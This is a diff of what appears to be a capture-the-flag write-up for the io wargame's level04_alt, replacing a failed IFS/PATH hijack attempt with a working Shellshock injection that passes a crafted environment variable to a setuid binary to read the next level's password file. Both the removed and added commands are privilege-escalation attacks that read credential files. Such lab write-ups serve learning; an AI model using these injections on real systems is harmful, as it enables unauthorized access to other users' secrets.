@@ -64,18 +64,9 @@ int main(){
 }
 ```
 
-Oki this time we have full path but using the system call can be dangerous. It should all about adding / to IFS but I can't seem to get it working
-
-I have tried to
+Tried some old tricks using IFS to split the system call into usr bin id but it never worked. So I tried shellshock
 
 ```sh
-export IFS='/'
-export PATH=.:$PATH
-echo "cat /home/level5/.pass" > usr
-chmod 777 usr
-/levels/level04_alt
+level4@io:/tmp/d$ env x='() { :;}; cat /home/level5/.pass' /levels/level04_alt
+XXXXXXXXXXXXXXXX
 ```
-
-But even though the PATH shows spaces and not / it does not seem to work on system so I must be missing something .. returning for this on a rainy day :) or if you have a hint mail me
-
-
